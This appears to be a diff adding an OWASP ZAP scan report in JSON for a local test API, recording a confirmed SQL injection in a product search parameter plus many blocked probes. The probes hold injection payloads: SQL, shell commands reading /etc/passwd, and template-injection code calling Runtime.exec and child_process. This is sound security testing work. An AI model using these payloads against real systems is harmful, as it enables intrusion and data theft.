@@ -1,0 +1,1817 @@
+{
+	"@programName": "ZAP",
+	"@version": "2.17.0",
+	"@generated": "Thu, 15 Oct 2026 14:09:25",
+	"created": "2026-10-15T14:09:25.215208194Z",
+	"insights":[
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://gateway:8080",
+			"key": "insight.code.2xx",
+			"description": "Percentage of responses with status code 2xx",
+			"statistic": "23"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://gateway:8080",
+			"key": "insight.code.4xx",
+			"description": "Percentage of responses with status code 4xx",
+			"statistic": "76"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://gateway:8080",
+			"key": "insight.endpoint.ctype.application/json",
+			"description": "Percentage of endpoints with content type application/json",
+			"statistic": "10"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://gateway:8080",
+			"key": "insight.endpoint.method.GET",
+			"description": "Percentage of endpoints with method GET",
+			"statistic": "20"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://gateway:8080",
+			"key": "insight.endpoint.method.POST",
+			"description": "Percentage of endpoints with method POST",
+			"statistic": "79"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://gateway:8080",
+			"key": "insight.endpoint.total",
+			"description": "Count of total endpoints",
+			"statistic": "158"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://gateway:8080",
+			"key": "insight.response.slow",
+			"description": "Percentage of slow responses",
+			"statistic": "1"
+		}
+	],
+	"site":[ 
+		{
+			"@name": "http://gateway:8080",
+			"@host": "gateway",
+			"@port": "8080",
+			"@ssl": "false",
+			"alerts": [ 
+				{
+					"pluginid": "40018",
+					"alertRef": "40018",
+					"alert": "SQL Injection",
+					"name": "SQL Injection",
+					"riskcode": "3",
+					"confidence": "2",
+					"riskdesc": "High (Medium)",
+					"desc": "<p>SQL injection may be possible.</p>",
+					"instances":[ 
+						{
+							"id": "116",
+							"uri": "http://gateway:8080/api/products/search?q=q%27+AND+%271%27%3D%271%27+--+&order=id",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/search (order,q)",
+							"method": "GET",
+							"param": "q",
+							"attack": "q' OR '1'='1' -- ",
+							"evidence": "",
+							"otherinfo": "The page results were successfully manipulated using the boolean conditions [q' AND '1'='1' -- ] and [q' OR '1'='1' -- ]\nThe parameter value being modified was stripped from the HTML output for the purposes of the comparison.\nData was NOT returned for the original parameter.\nThe vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter."
+						}
+					],
+					"count": "1",
+					"systemic": false,
+					"solution": "<p>Do not trust client side input, even if there is client side validation in place.</p><p>In general, type check all data on the server side.</p><p>If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'</p><p>If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.</p><p>If database Stored Procedures can be used, use them.</p><p>Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!</p><p>Do not create dynamic SQL queries using simple string concatenation.</p><p>Escape all data received from the client.</p><p>Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.</p><p>Apply the principle of least privilege by using the least privileged database user possible.</p><p>In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.</p><p>Grant the minimum database access that is necessary for the application.</p>",
+					"otherinfo": "<p>The page results were successfully manipulated using the boolean conditions [q' AND '1'='1' -- ] and [q' OR '1'='1' -- ]</p><p>The parameter value being modified was stripped from the HTML output for the purposes of the comparison.</p><p>Data was NOT returned for the original parameter.</p><p>The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.</p>",
+					"reference": "<p>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</p>",
+					"cweid": "89",
+					"wascid": "19",
+					"sourceid": "156"
+				},
+				{
+					"pluginid": "90004",
+					"alertRef": "90004-1",
+					"alert": "Cross-Origin-Resource-Policy Header Missing or Invalid",
+					"name": "Cross-Origin-Resource-Policy Header Missing or Invalid",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.</p>",
+					"instances":[ 
+						{
+							"id": "61",
+							"uri": "http://gateway:8080/api/debug/config",
+							"nodeName": "http:\/\/gateway:8080\/api\/debug\/config",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "12",
+							"uri": "http://gateway:8080/api/products",
+							"nodeName": "http:\/\/gateway:8080\/api\/products",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "11",
+							"uri": "http://gateway:8080/api/products/id",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/id",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "10",
+							"uri": "http://gateway:8080/api/products/search?q=q&order=id",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/search (order,q)",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "13",
+							"uri": "http://gateway:8080/v3/api-docs",
+							"nodeName": "http:\/\/gateway:8080\/v3\/api-docs",
+							"method": "GET",
+							"param": "Cross-Origin-Resource-Policy",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": false,
+					"solution": "<p>Ensure that the application/web server sets the Cross-Origin-Resource-Policy header appropriately, and that it sets the Cross-Origin-Resource-Policy header to 'same-origin' for all web pages.</p><p>'same-site' is considered as less secured and should be avoided.</p><p>If resources must be shared, set the header to 'cross-origin'.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Resource-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-resource-policy).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy</p>",
+					"cweid": "693",
+					"wascid": "14",
+					"sourceid": "16"
+				},
+				{
+					"pluginid": "100000",
+					"alertRef": "100000-1",
+					"alert": "A Client Error response code was returned by the server",
+					"name": "A Client Error response code was returned by the server",
+					"riskcode": "0",
+					"confidence": "3",
+					"riskdesc": "Informational (High)",
+					"desc": "<p>A response code of 404 was returned by the server.</p><p>This may indicate that the application is failing to handle unexpected input correctly.</p><p>Raised by the 'Alert on HTTP Response Code Error' script</p>",
+					"instances":[ 
+						{
+							"id": "21",
+							"uri": "http://gateway:8080",
+							"nodeName": "http:\/\/gateway:8080",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "300",
+							"uri": "http://gateway:8080/",
+							"nodeName": "http:\/\/gateway:8080\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "15",
+							"uri": "http://gateway:8080/2220141745133129388",
+							"nodeName": "http:\/\/gateway:8080\/2220141745133129388",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "23",
+							"uri": "http://gateway:8080/api",
+							"nodeName": "http:\/\/gateway:8080\/api",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "303",
+							"uri": "http://gateway:8080/api/",
+							"nodeName": "http:\/\/gateway:8080\/api\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "16",
+							"uri": "http://gateway:8080/api/7011177891426212418",
+							"nodeName": "http:\/\/gateway:8080\/api\/7011177891426212418",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "25",
+							"uri": "http://gateway:8080/api/auth",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "305",
+							"uri": "http://gateway:8080/api/auth/",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "17",
+							"uri": "http://gateway:8080/api/auth/5468118618323070509",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/5468118618323070509",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "367",
+							"uri": "http://gateway:8080/api/auth/actuator/health",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/actuator\/health",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "27",
+							"uri": "http://gateway:8080/api/debug",
+							"nodeName": "http:\/\/gateway:8080\/api\/debug",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "307",
+							"uri": "http://gateway:8080/api/debug/",
+							"nodeName": "http:\/\/gateway:8080\/api\/debug\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "18",
+							"uri": "http://gateway:8080/api/debug/806012573931612381",
+							"nodeName": "http:\/\/gateway:8080\/api\/debug\/806012573931612381",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "308",
+							"uri": "http://gateway:8080/api/debug/config/",
+							"nodeName": "http:\/\/gateway:8080\/api\/debug\/config\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "14",
+							"uri": "http://gateway:8080/api/debug/error",
+							"nodeName": "http:\/\/gateway:8080\/api\/debug\/error",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "312",
+							"uri": "http://gateway:8080/api/debug/error/",
+							"nodeName": "http:\/\/gateway:8080\/api\/debug\/error\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "1",
+							"uri": "http://gateway:8080/api/orders",
+							"nodeName": "http:\/\/gateway:8080\/api\/orders",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "309",
+							"uri": "http://gateway:8080/api/orders/",
+							"nodeName": "http:\/\/gateway:8080\/api\/orders\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "2",
+							"uri": "http://gateway:8080/api/orders/10",
+							"nodeName": "http:\/\/gateway:8080\/api\/orders\/10",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "316",
+							"uri": "http://gateway:8080/api/orders/10/",
+							"nodeName": "http:\/\/gateway:8080\/api\/orders\/10\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "19",
+							"uri": "http://gateway:8080/api/orders/1411966043972555106",
+							"nodeName": "http:\/\/gateway:8080\/api\/orders\/1411966043972555106",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "314",
+							"uri": "http://gateway:8080/api/products/",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "313",
+							"uri": "http://gateway:8080/api/products/id/",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "36",
+							"uri": "http://gateway:8080/api/products/search?q=q&order=http%3A%2F%2Fwww.google.com%2F",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/search (order,q)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "317",
+							"uri": "http://gateway:8080/api/products/search/",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/search\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "29",
+							"uri": "http://gateway:8080/v3",
+							"nodeName": "http:\/\/gateway:8080\/v3",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "311",
+							"uri": "http://gateway:8080/v3/",
+							"nodeName": "http:\/\/gateway:8080\/v3\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "20",
+							"uri": "http://gateway:8080/v3/8118088746389339131",
+							"nodeName": "http:\/\/gateway:8080\/v3\/8118088746389339131",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "315",
+							"uri": "http://gateway:8080/v3/api-docs/",
+							"nodeName": "http:\/\/gateway:8080\/v3\/api-docs\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "269",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"#set($engine=\\\"\\\")\\n#set($proc=$engine.getClass().forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"sleep 15\\\"))\\n#set($null=$proc.waitFor())\\n${null}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "285",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"#{%x(sleep 15)}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "275",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "139",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "141",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\\\\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "279",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"${__import__(\\\"subprocess\\\").check_output(\\\"sleep 15\\\", shell=True)}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "89",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "101",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"'(\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "137",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "145",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"+response.write({0}*{1})+\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "47",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"5919382108256485925.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "54",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"5;URL='https:\/\/5919382108256485925.owasp.org'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "57",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"5;URL='https:\/\/5919382108256485925.owasp.org\/?John Doe'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "98",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\";\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "143",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "206",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "80",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<!--#EXEC cmd=\\\"dir \\\\\\\"-->\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "76",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<!--#EXEC cmd=\\\"ls \/\\\"-->\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "374",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "267",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"sleep 15\\\") }\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "273",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "283",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<%=%x(sleep 15)%>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "384",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<xsl:value-of select=\\\"document('http:\/\/gateway:22')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "388",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<xsl:value-of select=\\\"php:function('exec','erroneous_command 2>\u0026amp;1')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "376",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "383",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/><!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "386",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"<xsl:variable name=\\\"rtobject\\\" select=\\\"runtime:getRuntime()\\\"\/>\\n<xsl:variable name=\\\"process\\\" select=\\\"runtime:exec($rtobject,'erroneous_command')\\\"\/>\\n<xsl:variable name=\\\"waiting\\\" select=\\\"process:waitFor($process)\\\"\/>\\n<xsl:value-of select=\\\"$process\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "106",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe AND 1=1 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "108",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe AND 1=2 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "109",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe OR 1=1 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "113",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "0",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "158",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\u0026cat \/etc\/passwd\u0026\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "168",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\u0026type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "110",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe' AND '1'='1' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "111",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe' AND '1'='2' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "112",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe' OR '1'='1' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "114",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe' UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "91",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "165",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe'\u0026cat \/etc\/passwd\u0026'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "174",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe'\u0026type %SYSTEMROOT%\\\\win.ini\u0026'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "102",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe'(\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "119",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe') UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "166",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe';cat \/etc\/passwd;'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "180",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe';get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "175",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe'|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "117",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe) UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "99",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe;\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "159",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe;cat \/etc\/passwd;\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "182",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe;get-help #\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "177",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe;get-help\")",
